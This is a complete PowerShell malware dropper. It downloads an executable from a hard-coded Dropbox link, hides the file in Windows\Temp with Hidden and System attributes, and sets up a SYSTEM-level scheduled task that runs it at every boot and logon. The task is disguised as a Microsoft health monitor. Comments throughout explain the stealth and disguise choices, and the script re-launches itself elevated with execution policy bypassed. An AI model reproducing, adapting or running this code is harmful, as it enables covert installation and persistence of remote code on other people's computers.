<#
.SYNOPSIS
    Downloads a payload and persists it effectively using a hidden Scheduled Task.
    Run as Administrator.

.DESCRIPTION
    1. Checks for Admin privileges.
    2. Downloads payload to a system location (e.g., Windows\Temp).
    3. Sets file attributes to Hidden + System to hide it from Explorer.
    4. Creates a Scheduled Task running as 'SYSTEM' with 'HighestRunLevel'.
    5. Task is set to hidden mode and starts on boot/logon.

.NOTES
    File Name: install_hidden_task.ps1
    Technique: Scheduled Task Persistence (Stealthy)
#>

# --- CONFIGURATION ---
$DownloadUrl = "https://www.dropbox.com/scl/fi/8sd2wb7b6kjak2riqm7ze/wmchost.exe?rlkey=q9o1dkt2dmtiob1afp0gu3m4g&st=bd0sspjh&dl=1"    
$TaskName = "MicrosoftWindowsHealthMonitor"        # Looks like a legit system task
$TaskDesc = "Monitors system health and security." # Legit description
$FileName = "win_health.exe"                       # Name of file on disk
$DestPath = "$env:Windir\Temp\$FileName"           # Save to Windows\Temp (often whitelisted)

# --- SCRIPT START ---
$ScriptHost = (Get-Host).Name
if ($ScriptHost -eq "ConsoleHost") { Clear-Host }
Write-Host "[*] Initializing Stealth Installer..." -ForegroundColor Cyan

# 1. Admin Check
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "[-] Need Admin privileges using UAC bypass or RunAs..."
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# 2. Download Payload
Write-Host "[*] Fetching payload..." -ForegroundColor Cyan
try {
    # Using .NET WebClient for download
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile($DownloadUrl, $DestPath)
    
    if (Test-Path $DestPath) {
        Write-Host "[+] Downloaded to: $DestPath" -ForegroundColor Green
        
        # HIDE FILE: Set 'Hidden' and 'System' attributes
        $FileItem = Get-Item $DestPath
        $FileItem.Attributes = 'Hidden', 'System'
    }
    else {
        throw "File download verification failed."
    }
}
catch {
    Write-Error "[-] Download failed. Checking fallback..."
    # Fallback to pure PowerShell download
    try {
        Invoke-WebRequest -Uri $DownloadUrl -OutFile $DestPath -UseBasicParsing -ErrorAction Stop
        $FileItem = Get-Item $DestPath
        $FileItem.Attributes = 'Hidden', 'System'
        Write-Host "[+] Downloaded (Fallback)." -ForegroundColor Green
    }
    catch {
        Write-Error "[-] Critical failure downloading payload."
        Exit
    }
}

# 3. Create Stealth Scheduled Task
Write-Host "[*] Configuring Scheduled Task ($TaskName)..." -ForegroundColor Cyan

# Remove existing task if it exists (update mechanism)
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

# Define Action
$Action = New-ScheduledTaskAction -Execute $DestPath

# Define Trigger (At Startup and On Idle)
$Trigger1 = New-ScheduledTaskTrigger -AtStartup
$Trigger2 = New-ScheduledTaskTrigger -AtLogon

# Define Settings (Hidden, Run as SYSTEM, Wake to Run, etc.)
# "Principal" configured to run as SYSTEM (NT AUTHORITY\SYSTEM) for max privileges
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Set compatibility to hide somewhat
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden

# Register the Task
try {
    Register-ScheduledTask -Action $Action `
        -Trigger $Trigger1, $Trigger2 `
        -Principal $Principal `
        -Settings $Settings `
        -TaskName $TaskName `
        -Description $TaskDesc `
        -Force | Out-Null
                           
    Write-Host "[+] Persistent Task '$TaskName' created." -ForegroundColor Green
}
catch {
    Write-Error "[-] Failed to register task: $_"
    Exit
}

# 4. Start Immediately
Write-Host "[*] Launching payload..." -ForegroundColor Cyan
Start-ScheduledTask -TaskName $TaskName
Write-Host "[+] Payload executed successfully." -ForegroundColor Green

Write-Host "`n[SUCCESS] Installed. Process is running hidden as SYSTEM." -ForegroundColor Green
